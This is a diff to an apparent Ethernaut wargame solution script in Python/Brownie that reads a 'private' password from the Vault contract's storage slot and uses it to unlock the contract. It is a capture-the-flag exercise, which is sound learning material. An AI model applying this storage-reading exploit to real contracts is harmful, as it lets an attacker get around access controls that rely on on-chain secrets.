@@ -3,7 +3,7 @@ import brownie
 from scripts.helpful_scripts import get_account
 from brownie import web3, interface, convert
 
-ETHERNAUT_INSTANCE = "0xE19b93d2dF67E1Ac734645c54d1E75CEB208B6EF"
+ETHERNAUT_INSTANCE = "0x6397B7130662EEa63eBfD9fAfE82Fd053C1a21Bb"
 
 
 def main():
@@ -14,11 +14,11 @@ def main():
     password = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 1)
     print(f"\nPassword = {password}\n")
 
-    # locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
-    # print(f"Vault is locked = {convert.to_bool(locked)}")
+    locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
+    print(f"\nVault is locked = {convert.to_bool(locked)}")
 
     vault = interface.VaultInterface(ETHERNAUT_INSTANCE)
     vault.unlock(password, {"from": player})
 
-    # locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
-    # print(f"Vault is locked = {convert.to_bool(locked)}")
+    locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
+    print(f"\nVault is locked = {convert.to_bool(locked)}")
